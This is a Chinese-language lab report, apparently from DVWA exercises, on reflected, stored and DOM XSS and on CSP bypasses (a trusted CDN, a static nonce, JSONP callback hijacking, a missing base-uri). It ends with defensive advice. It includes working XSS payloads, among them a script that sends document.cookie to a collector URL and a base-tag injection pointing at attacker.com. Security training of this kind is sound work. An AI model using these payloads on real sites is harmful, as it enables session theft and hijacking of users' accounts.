# 第六周：XSS 跨站脚本与 CSP 安全策略实战报告

> 实验目标：区分反射型、存储型、DOM 型 XSS；掌握 Cookie 窃取与前端过滤绕过；理解 CSP 机制及不同配置缺陷下的绕过手法。

## 一、实验概述与核心认知

XSS 的本质是浏览器把用户输入的恶意数据当代码执行。CSP 是限制代码来源的「白名单」，但配置不当或业务逻辑缺陷会导致其形同虚设。

## 二、三种类型的 XSS 基础实战

### 1. 反射型 XSS

恶意代码不存储服务器，通过 URL 参数反射回浏览器立即执行。

```html
<!-- Low -->
<script>alert("XSS")</script>
<!-- Medium（过滤 <script>）：大小写 / 事件属性绕过 -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>
<!-- 窃取 Cookie -->
<script>document.location="http://127.0.0.1:8888/steal?cookie="+document.cookie</script>
```

### 2. 存储型 XSS

恶意代码永久存服务器（留言板），任何访问者中招。

```html
<script>alert(document.cookie)</script>
```

Medium 双重绕过：前端 `Name` 框 `maxlength="10"` 限制、`Message` 框被 `strip_tags` 过滤。绕过：F12 改前端 `maxlength`，向 Name 框注入 `<img src=x onerror=alert(1)>`（需控制在字段长度限制内）。

### 3. DOM 型 XSS

不经过后端，纯前端 JS 把不可信数据（如 location.hash）写入 DOM。

```html
?default=<script>alert(document.cookie)</script>
<!-- Medium：HTML 闭合绕过 -->
?default=</option></select><img src=x onerror=alert(document.cookie)>
<!-- High：前后端认知差 -->
?default=English #<script>alert(1)</script>
```

## 三、CSP 深度实战与绕过

### 1. Low：白名单域滥用（CDN 信任漏洞）

策略信任可自由上传内容的公共 CDN：

```html
<script src="https://cdn.jsdelivr.net/gh/digininja/csp_bypass/alert.js"></script>
```

### 2. Medium：静态 Nonce 与 unsafe-inline 缺陷

策略同时含 `'unsafe-inline'` 和写死的静态 nonce。绕过：直接内联脚本，或复用静态 nonce：

```html
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

### 3. High：同源 JSONP 回调劫持

策略 `script-src 'self'` 极严格，但同源 `jsonp.php` 未过滤 callback：

```text
jsonp.php?callback=alert(document.cookie)
```

### 4. 进阶：base-uri 缺失

CSP 未定义 `base-uri`，注入 `<base href="https://attacker.com/">` 使相对路径脚本从攻击者服务器加载。

## 四、实验记录表

| 模块 | 级别 | 核心 Payload / 绕过特征 | 原理总结 |
|------|------|----------------------|---------|
| 反射型 XSS | Low/Medium | `<img src=x onerror=alert(1)>` | 输入未过滤，黑名单可被事件属性绕过 |
| 存储型 XSS | Low/Medium | 改前端长度 + `<img>` | 数据持久化，前后端校验不一致 |
| DOM 型 XSS | Low/Med/High | `</option></select><img>` / `English #<script>` | 前端 JS 逻辑缺陷，HTML 闭合与锚点绕过 |
| CSP Bypass | Low | jsDelivr 加载外部 JS | 错误信任可自由托管的公共 CDN |
| CSP Bypass | Medium | `<script nonce="...">` | nonce 静态可预测 + 允许 inline |
| CSP Bypass | High | `?callback=alert(1)` | 同源 JSONP 未过滤参数 |

## 五、防御建议

**XSS 防御**：对用户输入做上下文相关的 HTML 实体编码（`htmlspecialchars`）；Session Cookie 设 `HttpOnly`。

**CSP 防御**：禁用 `unsafe-inline`；nonce 必须密码学随机且每次请求更新；严格校验 JSONP 的 callback 参数；补全 `base-uri 'none'` 和 `object-src 'none'`。

> 最核心：CSP 只是缓解措施，根本仍在于修复后端代码漏洞（消除 XSS 注入点）。
